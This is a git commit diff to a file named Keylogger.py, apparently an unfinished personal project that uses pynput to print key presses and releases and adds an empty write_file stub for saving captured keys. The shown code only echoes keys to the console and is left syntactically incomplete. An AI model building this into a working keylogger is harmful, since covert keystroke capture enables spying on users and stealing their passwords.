f43d76f9efcfcf5f13fa6a91314bbb519d018665
hreamer <reamer.hudson@gmail.com>
2020-10-17 14:33:06 -0400

    Saving changes

--- Keylogger.py
+++ Keylogger.py
@@ -1,28 +1,24 @@
 from pynput import keyboard
 
+keys = []
+count = 0
+
 def on_press(key):
     try:
-        print('alphanumeric key {0} pressed'.format(
-            key.char))
+        print('alphanumeric key {0} pressed'.format(key.char))
     except AttributeError:
-        print('special key {0} pressed'.format(
-            key))
+        print('special key {0} pressed'.format(key))
 
 def on_release(key):
-    print('{0} released'.format(
-        key))
+    print('{0} released'.format(key))
     if key == keyboard.Key.esc:
         # Stop listener
         return False
 
+def write_file(keys):
+    
+
 # Collect events until released
-with keyboard.Listener(
-        on_press=on_press,
-        on_release=on_release) as listener:
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
 
-# ...or, in a non-blocking fashion:
-listener = keyboard.Listener(
-    on_press=on_press,
-    on_release=on_release)
-listener.start()
